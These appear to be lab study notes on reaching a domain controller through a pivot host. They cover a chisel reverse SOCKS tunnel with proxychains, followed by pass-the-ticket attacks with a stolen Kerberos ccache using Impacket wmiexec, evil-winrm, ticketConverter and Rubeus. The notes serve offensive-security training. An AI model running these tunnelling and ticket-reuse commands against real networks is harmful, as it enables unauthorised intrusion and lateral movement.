- In this scenario, our attack host doesn't have a connection to the KDC/Domain Controller, and we can't use the Domain Controller for name resolution. 
- To use Kerberos, we need to proxy our traffic via MS01 with a tool such as Chisel and Proxychains and edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.

## Start Pivopting and Tunnleing

### 1) Host File Modified
- edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.
```
cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
### 2) Proxychains Configuration File
- We need to modify our proxychains configuration file to use socks5 and port 1080.
```
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

### 3) Download Chisel to our Attack Host

```
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

### 4) Connect to MS01 with xfreerdp
```
$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### 5) Execute chisel from MS01
Note: The client IP is your attack host IP.
```
C:\User> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

### 6) Using Linux Attack Tools with Kerberos
we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.

#### **Using Impacket with proxychains and Kerberos Authentication**
Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
```
$ proxychains impacket-wmiexec dc01 -k
```


#### **Evil-Winrm**
- To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. 
- For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`.
- While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB or the domain we want`, and the KDC is the `DC01 or the DC we want`.
- In case the package krb5-user is already installed:
```
$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```
**Using Evil-WinRM with Kerberos**
```
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

### Impacket Ticket Converter
If we want to use a `ccache file in Windows` or a `kirbi file in a Linux machine`, we can use impacket-ticketConverter
```
$ /usr/share/doc/python3-impacket/examples/ticketConverter.py krb5cc_647401106_I8I133 julio.kirbi
```

### Importing Converted Ticket into Windows Session with Rubeus
```
C:\User> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

